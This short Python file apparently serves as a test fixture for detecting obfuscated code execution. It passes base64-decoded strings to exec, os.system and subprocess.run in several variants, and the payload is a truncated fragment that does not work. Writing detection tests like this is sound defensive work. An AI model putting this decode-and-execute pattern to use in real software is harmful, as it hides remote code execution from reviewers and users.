import base64
import builtins
import os
import subprocess

builtins.exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0I"))
os.system(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0I"))
__import__("builtins").exec(
    base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0I")
)
__import__("os").system(
    base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0I")
)
subprocess.run(["python", "-c", base64.b64decode("bar")])